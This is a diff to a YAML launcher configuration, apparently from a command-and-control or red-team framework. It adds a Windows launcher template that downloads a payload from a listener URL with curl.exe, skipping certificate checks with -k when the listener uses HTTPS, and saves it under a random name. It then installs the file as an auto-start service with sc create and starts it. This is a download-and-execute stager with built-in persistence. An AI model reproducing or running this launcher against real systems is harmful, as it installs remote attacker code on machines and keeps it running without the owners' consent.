@@ -93,3 +93,24 @@ launchers:
     args:
       - name: url
       - name: isHTTPS
+  - name: "Download, create and start service [CMD]"
+    match:
+      type: ["SERVICE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    template: 'curl.exe %%isHTTPS%% "%%url%%" -o "%%filename%%" && sc create %%svc_name%%_service binPath= "\"%CD%\%%filename%%\"" start= auto && sc start  %%svc_name%%_service'
+    args:
+      - name: url
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "-k" : "";
+      - name: randomBinName
+        jsFile: lib/arg.randomBinName.js
+      - name: filename
+        jsFn: |
+          const payloadType = payload.configuration.type;
+          const fileExtension = payloadsStore().extensionMap.get(payloadType);
+          `${argumentsPluginInterface['randomBinName']}.${fileExtension}`; // Using previously parsed argument via argumentsPluginInterface
+      - name: svc_name
+        jsFn: |
+          `${argumentsPluginInterface['randomBinName']}`;
